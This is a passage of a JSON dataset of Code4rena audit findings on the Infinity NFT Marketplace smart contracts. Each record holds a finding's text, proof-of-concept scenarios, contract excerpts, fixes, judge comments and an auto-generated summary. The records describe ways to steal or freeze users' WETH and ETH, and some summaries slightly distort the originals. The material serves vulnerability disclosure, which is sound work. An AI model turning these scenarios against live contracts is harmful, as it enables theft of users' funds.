user's wallet without any restriction is a dangerous practice given that many users give large/ infinite approval to contracts.\n\nIn addition, manual gas accounting is error prone and it would make more sense to allow users to match orders themselves instead of extracting fees to compensate the matcher.\n\n**[nneverlander (Infinity) acknowledged and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/74#issuecomment-1164323281):**\n > Thanks, we are adding a max price variable\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/74#issuecomment-1181073834):**\n > This is a clever way to leverage safeTransferFrom to grief users. Accepting as Medium risk.\n\n\n\n***\n\n\n\n",
      "summary": "\nThis bug report is about the function `matchOneToOneOrders` in the InfinityExchange smart contract. The function transfers an arbitrary amount of WETH from the user, `buy.signer`, in its inner call to `_execMatchOneToOneOrders`. This amount is calculated dynamically based off of the gas consumption consumed during the trace, and is controlled by the seller since the seller's token can be malicious and purposefully consume a large amount of gas to grief the buyer. If a buyer purchases a malicious token, the `_transferNFTs` will result in a call to an `ERC721.safeTransferFrom` that can exhibit any behavior such as wasting gas, resulting in the buyer's WETH being sent to the protocol. \n\nProof of concept of this vulnerability is a buyer giving infinite WETH approval to the exchange contract and unknowingly purchasing a malicious token from an attacker. The attacker's token wastes gas in the transfer call and causes all of the buyer's WETH to be sent to the protocol when `matchOneToOneOrders` is performed by the match executor.\n\nTo mitigate this vulnerability, it is recommended to allow users to input a maximum fee/ gas cost they are willing to spend on each order. Manual gas accounting is error prone and it would make more sense to allow users to match orders themselves instead of extracting fees to compensate the matcher.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/74",
      "tags": [],
      "finders": [
        "0xalpharush"
      ]
    },
    {
      "id": "2785",
      "title": "[M-08] Incorrect condition marks valid order as invalid",
      "impact": "MEDIUM",
      "content": "_Submitted by csanuragjain, also found by KIntern_\n\n\n`canExecMatchOrder` is having an incorrect check which makes a valid order as invalid. \n\n`doItemsIntersect` function is also checked on sell.nfts, buy.nfts which is incorrect. \n\n`doItemsIntersect` should only be checked in reference to constructedNfts.\n\n### Proof of Concept\n\n1.  Assume buy has nfts {A,B,C}, sell has nft {A,B}, constructedNfts has nft {A}, buy.constraints\\[0]/sell.constraints\\[0]/numConstructedItems is 1\n\n2.  Ideally this order should match since constructedNfts {A} is present in both buy and sell\n\n3.  But this will not match since doItemsIntersect(sell.nfts, buy.nfts) will fail because of item C which is not present in sell\n\n### Recommended Mitigation Steps\n\nRemove doItemsIntersect(sell.nfts, buy.nfts) from InfinityOrderBookComplication.sol#L140\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/120#issuecomment-1162975062):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/74a7d6b39dc441b5b496b74735a1b09b93bef12f\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/120#issuecomment-1179814096):**\n > Some orders that should be matched would revert. Lowering this to Medium risk.\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed for the code found at https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityOrderBookComplication.sol#L140. The bug is caused by an incorrect check which makes a valid order invalid. The check is done on sell.nfts and buy.nfts when it should only be done in reference to constructedNfts. The bug can be demonstrated by an example where buy has nfts {A,B,C}, sell has nft {A,B}, constructedNfts has nft {A}, buy.constraints[0]/sell.constraints[0]/numConstructedItems is 1. In this case, the order should match since constructedNfts {A} is present in both buy and sell, but the order will not match since doItemsIntersect(sell.nfts, buy.nfts) will fail due to item C not being present in sell. The recommended mitigation step is to remove doItemsIntersect(sell.nfts, buy.nfts) from InfinityOrderBookComplication.sol#L140.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/120",
      "tags": [],
      "finders": [
        "csanuragjain",
        "KIntern"
      ]
    },
    {
      "id": "2784",
      "title": "[M-07] Malicious governance can use `updateWethTranferGas` to steal WETH from buyers",
      "impact": "MEDIUM",
      "content": "_Submitted by shenwilly, also found by 0x29A, berndartmueller, BowTiedWardens, peritoflores, and VAD37_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1260-L1263>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L739-L747>\n\n### Vulnerability Details\n\nA malicious or compromised governance can set the transfer gas cost to an unreasonable amount and steal approved WETH from buyers.\n\nThere are two ways for governance to exploit this:\n\n*   When an order is being executed, governance can frontrun the transactions by setting `WETH_TRANSFER_GAS_UNITS` to a very high amount.\n*   Set `WETH_TRANSFER_GAS_UNITS` to a very high amount, and execute trades against active buy orders. As long as the value of WETH to steal is higher than the cost to prepare the NFTs to sell, it is profitable to do so.\n\n### Proof of Concept\n\n*   `WETH_TRANSFER_GAS_UNITS` is set to `50000`.\n*   Alice has 100 WETH and 100 USDC. She approved infinite allowance to `InfinityExchange`.\n*   Alice signs a buy order to buy a FakePunk NFT with 100 USDC price.\n*   Malicious governance sets `WETH_TRANSFER_GAS_UNITS` to a very high amount such that the [gasCost](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L739) calculation equals 100 WETH.\n*   Governance then bought a FakePunk in open market, and fills Alice's order.\n*   Alice received the NFT but paid 100 WETH as gas cost.\n\n### Recommended Mitigation Steps\n\nSet a sanity check in `updateWethTranferGas` so governance can't set it to unreasonable value. Consider using timelock for setting governance settings.\n\n    function updateWethTranferGas(uint32 _wethTransferGasUnits) external onlyOwner {\n        require(_wethTransferGasUnits <= 100000, \"gas unit must not be higher than 100000\");\n        WETH_TRANSFER_GAS_UNITS = _wethTransferGasUnits;\n        emit NewWethTransferGasUnits(_wethTransferGasUnits);\n    }\n\n**[nneverlander (Infinity) acknowledged, but disagreed with severity](https://github.com/code-423n4/2022-06-infinity-findings/issues/127)** \n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/127#issuecomment-1181006146):**\n > When a transaction is sent by the matching engine, the user pays for the gas costs of their portion of that call. There's overhead in actually getting the money from the user in WETH, which is estimated with WETH_TRANSFER_GAS_UNITS. That value is currently uncapped so the admin could increase it significantly, impacting users who signed orders back when that value was more reasonably assigned.\n> \n> Agree with Medium risk here.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the InfinityExchange smart contract. It is possible for a malicious or compromised governance to set the transfer gas cost to an unreasonable amount and steal approved WETH from buyers. There are two ways for governance to exploit this: when an order is being executed, they can frontrun the transactions by setting the WETH_TRANSFER_GAS_UNITS to a very high amount, or set the WETH_TRANSFER_GAS_UNITS to a very high amount and execute trades against active buy orders. A proof of concept was provided, in which the WETH_TRANSFER_GAS_UNITS was set to 50000, Alice had 100 WETH and 100 USDC, and she approved infinite allowance to the InfinityExchange. Malicious governance then set the WETH_TRANSFER_GAS_UNITS to a very high amount, bought a FakePunk in the open market, and filled Alice's order. As a result, Alice received the NFT but paid 100 WETH as gas cost.\n\nThe recommended mitigation steps are to set a sanity check in the updateWethTranferGas function so governance can't set it to unreasonable values, and consider using a timelock for setting governance settings.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/127",
      "tags": [],
      "finders": [
        "VAD37",
        "BowTiedWardens",
        "berndartmueller",
        "shenwilly",
        "peritoflores",
        "0x29A"
      ]
    },
    {
      "id": "2783",
      "title": "[M-06] Bug in `MatchOneToManyOrders` may cause tokens theft",
      "impact": "MEDIUM",
      "content": "_Submitted by PwnedNoMore_\n\nThe `MatchOneToManyOrders` does not check whether a given sell order is malicious, i.e., containing no NFT tokens but still requiring payment.\n\nThis may cause the sellers to maliciously profit.\n\nFor example, we have a `buyOrder` and a set of sell orders `[sellOrder0, sellOrder1, sellOrder2]`. Originally, they match well but with a legal price gas (which is common in the real world), i.e., `MatchOneToManyOrders(buyOrder, [sellOrder0, sellOrder1, sellOrder2])` can be successfully processed.\n\nHowever, If the hacker proposes another `sellOrder3` which sells nothing but requests money/tokens. The `MatchOneToManyOrders(buyOrder, [sellOrder0, sellOrder1, sellOrder2, sellOrder3])` will also succeed and the hacker does not need to send out any NFT token but grabs a considerable gain.\n\n### Attack Scenario\n\nThere are two possible attack scenarios.\n\n#### The `MATCH_EXECUTOR` is not in a good faith\n\n`MATCH_EXECUTOR` can always gain profit by leveraging this vulnerability. That is, every time the executor proposes a `MatchOneToManyOrders`, it can add one more *EMPTY* order to gain the profit.\n\nIt is one kind of centralization issue. All the processes should happen in a trust-less environment.\n\n#### Hackers can brute force the price gaps by sending out a large amount of *EMPTY* sell orders\n\nNote that creating an order happens off-chain. That means, the hacker can send out a large amount of *EMPTY* orders without paying any gas fee.\n\nOnce the executor picks any of the malicious orders, the hacker can gain the profit without a loss of NFT tokens.\n\nThis vulnerability also affects `matchOrders`.\n\n### Proof of Concept\n\nFor full details, see [original submission](https://github.com/code-423n4/2022-06-infinity-findings/issues/65).\n\n### Recommended Mitigation Steps\n\nTo mitigate the issue entirely, I would suggest banning any empty NFT transfers.\n\nFor example, `numNfts` must be bigger than zero [here](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1042). Also make sure the ERC1155 transferring at least 1 item.\n\n**[nneverlander (Infinity) acknowledged and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/65#issuecomment-1162896366):**\n> Please check this: https://github.com/infinitydotxyz/exchange-contracts-v2/commit/7f0e195d52165853281b971b8610b27140da6e41\n> \n> No more ERC1155 either.\n> \n> The loop that transfers NFTs already checks for non empty array\n> \n> Not sure of the assessment.\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/65#issuecomment-1179750238):**\n> This is a great report, appreciate the detail and the PoC code.\n> \n> Given that the call must originate from the match executor, it seems unlikely that it would match with an empty sell order. Additionally it should be easy to filter these when submitted off-chain. With that in mind, lowering this to a Medium risk issue.\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed concerning the `MatchOneToManyOrders` function in the code-423n4/2022-06-infinity repository. The bug allows malicious actors to profit without sending out any Non-Fungible Tokens (NFTs). This could be done by creating a sell order that requires payment but contains no NFTs. \n\nThe bug affects both the `MatchOneToManyOrders` and `matchOrders` functions. An attack scenario could be the `MATCH_EXECUTOR` taking advantage of the vulnerability by adding an *EMPTY* order to gain a profit, or a hacker sending out a large amount of *EMPTY* orders without paying any gas fee. The bug has been confirmed using manual inspection and a proof of concept script.\n\nThe recommended mitigation step is to ban any empty NFT transfers, such as making sure `numNfts` is bigger than zero and that the ERC1155 is transferring at least 1 item.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/65",
      "tags": [],
      "finders": [
        "PwnedNoMore"
      ]
    },
    {
      "id": "2782",
      "title": "[M-05] ETH mistakenly sent over with ERC20 based `takeOrders` and `takeMultipleOneOrders` calls will be lost",
      "impact": "MEDIUM",
      "content": "_Submitted by obtarian, also found by 0xsanson, cccz, and VAD37_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363>\n\n### Vulnerability details\n\n`takeOrders()` and `takeMultipleOneOrders()` are the main user facing functionality of the protocol. Both require `currency` to be fixed for the call and can have it either as a ERC20 token or ETH. This way, the probability of a user sending over a ETH with the call whose `currency` is a ERC20 token isn't negligible. However, in this case ETH funds of a user will be permanently lost.\n\nSetting the severity to medium as this is permanent fund freeze scenario conditional on a user mistake, which probability can be deemed high enough as the same functions are used for ETH and ERC20 orders.\n\n### Proof of Concept\n\nBoth takeOrders() and takeMultipleOneOrders() only check that ETH funds are enough to cover the order's `totalPrice`:\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327>\n\n```solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363>\n\n```solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n```\n\nWhen `currency` is some ERC20 token, while `msg.value > 0`, the `msg.value` will be permanently frozen within the contract.\n\n### Recommended Mitigation Steps\n\nConsider adding the check for `msg.value` to be zero for the cases when it is not utilized:\n\n```solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    } else {\n      require(msg.value == 0, 'non-zero ETH value');\n    }\n```\n\n**[nneverlander (Infinity) confirmed](https://github.com/code-423n4/2022-06-infinity-findings/issues/346)**\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/346#issuecomment-1179723118):**\n > When accepting an order using ERC20 tokens, any ETH included will be accepted as exchange fees instead of reverting the tx or refunding to the user.\n> \n> This is a result of user error, but leads to a direct loss of funds. Accepting as a Medium risk submission.\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the code of the InfinityExchange.sol contract, which could potentially lead to a user permanently losing their ETH funds. This bug occurs when a user attempts to make an order using ETH, and the `currency` passed in the call is a ERC20 token. In this case, the `msg.value` will be permanently frozen within the contract, as the code only checks that `msg.value` is enough to cover the order's `totalPrice`.\n\nThe severity of this bug has been set to medium, as it is a permanent fund freeze scenario that is conditional on a user mistake, and the probability of it occurring is deemed high enough as the same functions are used for both ETH and ERC20 orders.\n\nTo mitigate this bug, the code should be modified to include a check for `msg.value` to be zero for cases when it is not utilized. The recommended code is provided in the bug report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/346",
      "tags": [],
      "finders": [
        "cccz",
        "obtarian",
        "VAD37",
        "0xsanson"
      ]
    },
    {
      "id": "2781",
      "title": "[M-04] Fund loss or griefing in all order matching functions [`matchOneToOneOrders()`, `matchOneToManyOrders()`, `matchOrders()`, `takeMultipleOneOrders()`, `takeOrders()`] because condition `(seller != buyer )` is not checked in any of them",
      "impact": "MEDIUM",
      "content": "_Submitted by unforgiven, also found by GreyArt_\n\nFunctions `matchOneToOneOrders()`, `matchOneToManyOrders()`, `matchOrders()`, `takeMultipleOneOrders()`, `takeOrders()` are for order matching and order execution and they validate different things about orders but there is no check for that `seller != buyer`, which can cause wrong order matching resulting in fund lose or fund theft or griefing. (it can be combined with other vulns to perform more damaging attacks)\n\n### Proof of Concept\n\nWe only give proof of concept for `matchOneToManyOrders()` and other order execution/matching functions has similar bugs which root cause is not checking `seller != buyer`.\nThis is `matchOneToManyOrders()` code:\n\n      /**\n       @notice Matches one  order to many orders. Example: A buy order with 5 specific NFTs with 5 sell orders with those specific NFTs.\n       @dev Can only be called by the match executor. Refunds gas cost incurred by the\n            match executor to this contract. Checks whether the given complication can execute the match.\n       @param makerOrder The one order to match\n       @param manyMakerOrders Array of multiple orders to match the one order against\n      */\n      function matchOneToManyOrders(\n        OrderTypes.MakerOrder calldata makerOrder,\n        OrderTypes.MakerOrder[] calldata manyMakerOrders\n      ) external {\n        uint256 startGas = gasleft();\n        require(msg.sender == MATCH_EXECUTOR, 'OME');\n        require(_complications.contains(makerOrder.execParams[0]), 'invalid complication');\n        require(\n          IComplication(makerOrder.execParams[0]).canExecMatchOneToMany(makerOrder, manyMakerOrders),\n          'cannot execute'\n        );\n        bytes32 makerOrderHash = _hash(makerOrder);\n        require(isOrderValid(makerOrder, makerOrderHash), 'invalid maker order');\n        uint256 ordersLength = manyMakerOrders.length;\n        // the below 3 variables are copied to memory once to save on gas\n        // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n        // since these values won't change during function execution, we can save on gas by copying them to memory once\n        // instead of SLOADing once for each loop iteration\n        uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n        uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n        address weth = WETH;\n        if (makerOrder.isSellOrder) {\n          for (uint256 i = 0; i < ordersLength; ) {\n            // 20000 for the SSTORE op that updates maker nonce status from zero to a non zero status\n            uint256 startGasPerOrder = gasleft() + ((startGas + 20000 - gasleft()) / ordersLength);\n            _matchOneMakerSellToManyMakerBuys(\n              makerOrderHash,\n              makerOrder,\n              manyMakerOrders[i],\n              startGasPerOrder,\n              protocolFeeBps,\n              wethTransferGasUnits,\n              weth\n            );\n            unchecked {\n              ++i;\n            }\n          }\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n        } else {\n          uint256 protocolFee;\n          for (uint256 i = 0; i < ordersLength; ) {\n            protocolFee += _matchOneMakerBuyToManyMakerSells(\n              makerOrderHash,\n              manyMakerOrders[i],\n              makerOrder,\n              protocolFeeBps\n            );\n            unchecked {\n              ++i;\n            }\n          }\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n          uint256 gasCost = (startGas - gasleft() + WETH_TRANSFER_GAS_UNITS) * tx.gasprice;\n          // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n          // else we need to send the protocol fee separately in the execution currency\n          // since the buyer is common across many sell orders, this part can be executed outside the above for loop\n          // in contrast to the case where if the one order is a sell order, we need to do this in each for loop\n          if (makerOrder.execParams[1] == weth) {\n            IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), protocolFee + gasCost);\n          } else {\n            IERC20(makerOrder.execParams[1]).safeTransferFrom(makerOrder.signer, address(this), protocolFee);\n            IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), gasCost);\n          }\n        }\n      }\n\nin its executions it calls `InfinityOrderBookComplication.canExecMatchOneToMany()`, `verifyMatchOneToManyOrders()`, `isOrderValid()` to see that if orders are valid and one order matched to all other orders but there is no check for `seller != buyer` in any of those functions. and also `ERC721` and `ERC20` allows funds and assets to be transferred from address to itself.\nSo it's possible for `matchOneToManyOrders()` to match one user sell orders to its buy orders which can cause fund theft or griefing. This is the scenario for fund lose in `matchOneToManyOrders()`:\n\n1.  Let's assume orders `NFT` ids are for one collection for simplicity.\n2.  `NFT ID[1]` fair price is `8 ETH` and `NFT ID[2]` fair price is `2 ETH`.\n3.  `user1` wants to buy `NFT IDs[1,2]` at `10 ETH` (both of them) so he create one buy order and signs it.\n4.  `user1` wants to sell `NFT ID[1]` at `2.5 ETH` and sell `NFT ID[2]` at `8.5 ETH`. and he wants to sell them immediately after buying them so he create this two sell orders and sign them.\n5.  `attacker` who has `NFT ID[1]` creates an sell order for it at `7.5 ETH` and signs it.\n6.  Off-chain machining engine sends this orders to `matchOneToManyOrders()`: many orders = \\[`(attacker sell ID[1] at 7.5 ETH)` , `(user1 sell ID[1] at 2.5 ETH)`] , one order = `(user1 buy IDs[1,2] at 10ETH)`\n7.  Function `matchOneToManyOrders()` logic will check orders and their matching and all the checks would be passed for matching one order to many order(becase tokens lists intersects and numTokens are valids too (`1+1=2`))\n8.  Function `matchOneToManyOrders()` would execute order and transfer funds and tokens which would result in: (transferring `7.5 ETH` from `user 1` to `attacker`) (transferring `2.5 ETH` from `user1` to `user1`) (transferring `NFT ID[1]` from `attacker` to `user1`) (transferring `NFT ID[1]` from `user1` to `user1`)\n9.  So in the end contract executed `user1` buy order `(user1 buy IDs[1,2] at 10ETH)` but `user` only received `NFT ID[1]` and didn't received `NFT ID[2]` so contract code perform operation contradiction to what `user1` has been signed.\n\nOf course for this attack to work for `matchOneToManyOrders()` off-chain matching engine need to send wrong data but checks on the contract are not enough.\n\nThere are other scenarios for other functions that can cause griefing, for example for function `matchOrders()`:\na user can have multiple order to buy some tokens in list of ids. it's possible to match these old orders:\n\n1.  `user1` has this order: A:`(user1 BUY 1 of IDs[1,2,3])` and  B:`(user1 BUY 1 of IDs[1,4,5])`\n2.  then the order B get executed for ID\\[1] and `user1` become the owner of `ID[1]`\n3.  `user1` wants to sell some of his tokens so he signs this order: C::`(user1 SELL 1 of IDs[1,6,7])`\n4.  matching engine would send order A and C with `constructedNfts=ID[1]` to `matchOrders()`.\n5.  `matchOrders()` would check conditions and would see that conditions are met and perform the transaction.\n6.  `user1` would pay some unnecessary order fee and it would become like griefing and DOS attack for him.\n\nThere may be other scenarios for this vulnerability to be harmful for users.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nAdd some checks to ensure that `seller != buyer`\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/130#issuecomment-1160551805):**\n > Agree with assessment. Fixed in: https://github.com/infinitydotxyz/exchange-contracts-v2/commit/c3c0684ac02e0cf1c03cdbee7e68c5a37fa334a8\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/130#issuecomment-1179818269):**\n > This is an interesting scenario where a buyer looking to flip immediately could have their order under filled.\n> \n> Given the specifics of this scenario where the user needs to sign both a buy and a sell with the same NFTs, I'm inclined to rate this a Medium risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about functions in the InfinityExchange.sol contract that are used for order matching and order execution. These functions do not have a check for seller and buyer being different, which can lead to wrong order matching and potential fund loss. This vulnerability can be combined with other vulnerabilities to do more damage. \n\nA proof of concept is given for the function matchOneToManyOrders(). In this scenario, a user wants to buy two NFTs at a total cost of 10 ETH. They create one buy order and two sell orders, one for each NFT. An attacker who has one of the NFTs creates a sell order for it at 7.5 ETH. The off-chain matching engine sends these orders to the matchOneToManyOrders() function, which checks that the orders are valid and matches the one order to the many orders. The result is that the user transfers 7.5 ETH to the attacker, 2.5 ETH to themselves, and they receive the NFT from the attacker. \n\nFor the matchOrders() function, a user can have multiple orders to buy some tokens in a list of IDs. If the order is old, it is possible to match it. The user would then pay an unnecessary order fee, which could be seen as a griefing or DDoS attack. \n\nThe recommended mitigation step is to add checks to ensure that the seller and buyer are different.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/130",
      "tags": [],
      "finders": [
        "unforgiven",
        "GreyArt"
      ]
    },
    {
      "id": "2780",
      "title": "[M-03] Protocol fee rate can be arbitrarily modified by the owner and the new rate will apply to all existing orders",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug, also found by berndartmueller, BowTiedWardens, cccz, csanuragjain, defsec, GreyArt, joestakey, m9800, peritoflores, reassor, Ruhum, shenwilly, throttle, and zer0dot_\n\n```solidity\nfunction matchOneToOneOrders(\n    OrderTypes.MakerOrder[] calldata makerOrders1,\n    OrderTypes.MakerOrder[] calldata makerOrders2\n  ) external {\n    uint256 startGas = gasleft();\n    uint256 numMakerOrders = makerOrders1.length;\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(numMakerOrders == makerOrders2.length, 'mismatched lengths');\n\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n```\n\nPer [the comment](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1120-L1121):\n\n> Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is the one that actually 'pays' the fees\n\nAnd the code:\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L725-L729>\n\n```solidity\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _transferMultipleNFTs(sell.signer, buy.signer, sell.nfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, sell.signer, remainingAmount);\n```\n\nIn the current design/implementation, the protocol fee is paid from the buyer's wallet, regardless of whether the buyer is the taker or the maker. And the protocol fee will be deducted from the `execPrice`, only the `remainingAmount` will be sent to the seller.\n\nThis is unconventional as if the buyer placed a limit order, say to sell 1 Punk for 100 ETH, it means that the seller is expected to receive 100 ETH. And now the seller must consider the fee rate and if they expect 100 ETH, the price must be set to 101 ETH.\n\nWhile this is unconventional and a little inconvenience, it's still acceptable IF the protocol fee rate is fixed, OR the seller is the taker so that they can do the math and agrees to the protocol fee when they choose to fulfill the counterparty's maker order.\n\nHowever, that's not always the case with the current implementation: the protocol can be changed, effective immediately, and applies to all existing orders.\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1265-L1269>\n\n```solidity\n    /// @dev updates exchange fees\n  function setProtocolFee(uint16 _protocolFeeBps) external onlyOwner {\n    PROTOCOL_FEE_BPS = _protocolFeeBps;\n    emit NewProtocolFee(_protocolFeeBps);\n  }\n```\n\nPlus, when the protocol fee rate updated to a higher rate, say from `5%` to `50%`, an maker order placed before this fee rate update can be fulfilled by a buyer, while the buyer still pays the same amount, the seller (maker) will receive `45%` less than the initial sell order amount.\n\n### Recommendation\n\n1.  Consider making the protocol fee rate a constant, ie, can not be changed;\n2.  Or, consider changing to the protocol fee always be paid by the taker; while matching the maker buy and maker sell orders, the protocol fee must be paid from the price difference between the buy price and sell price;\n3.  Or, consider changing to the new protocol fee only applies to the orders created after the rate updated.\n\n**[nneverlander (Infinity) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/259#issuecomment-1160585250):**\n > This was a design decision. Initially we were fetching the protocol fee from the complication but decided not to make external contract calls for this to save on gas. The other option was to make the protocol fee a part of the maker order but that comes with its own attack surface.  So we implemented a compromise: https://github.com/infinitydotxyz/exchange-contracts-v2/commit/793ee814d86030477470c81c4f6fda353967a42a\n> \n> As such the severity of the bug can be classified as low since this assumes malicious intent on part of the protocol admin.\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/259#issuecomment-1179592297):**\n> Maker sell orders are charged the fee set at the time an order is filled and not when the order was created.\n> \n> I'm not sure that I agree this concern is limited to malicious intent. With the ability to change fee, it's safe to assume at some point the admin may choose to increase the fee. At that point, all outstanding maker sells are subject to a higher fee than expected. Some users may be more sensitive to this than others. The warden's recommendations seems to address that concern and the fix the sponsor posted mitigates it by setting a max fee that may apply.\n> \n> I think this is a Medium risk issue - an unexpected bump in fee impacting users who interacted with the system previous to that change is a form of value leak.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the code of the InfinityExchange smart contract. The code in question is from lines 132 to 146 and from lines 1120 to 1121. The issue is that the protocol fee is paid from the buyer's wallet regardless of whether the buyer is the taker or the maker. This means that if the buyer places a limit order, say to sell 1 Punk for 100 ETH, the seller will only receive the amount after the protocol fee is deducted from the execPrice. This is unconventional, as the seller is expected to receive the full amount. Additionally, the protocol fee rate can be changed, which could be detrimental to the seller. \n\nThe report recommends three potential solutions. The first is to make the protocol fee rate a constant, so it can not be changed. The second is to make the protocol fee always be paid by the taker. This means that when matching the maker buy and maker sell orders, the protocol fee must be paid from the price difference between the buy price and sell price. The third is to make the new protocol fee only applies to the orders created after the rate updated. \n\nOverall, this bug report is about an issue in the code of the InfinityExchange smart contract, where the protocol fee is paid from the buyer's wallet regardless of whether the buyer is the taker or the maker. The report recommends three potential solutions to address the issue.",
      "quality_score": 3,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/259",
      "tags": [
        "Admin"
      ],
      "finders": [
        "csanuragjain",
        "GreyArt",
        "zer0dot",
        "reassor",
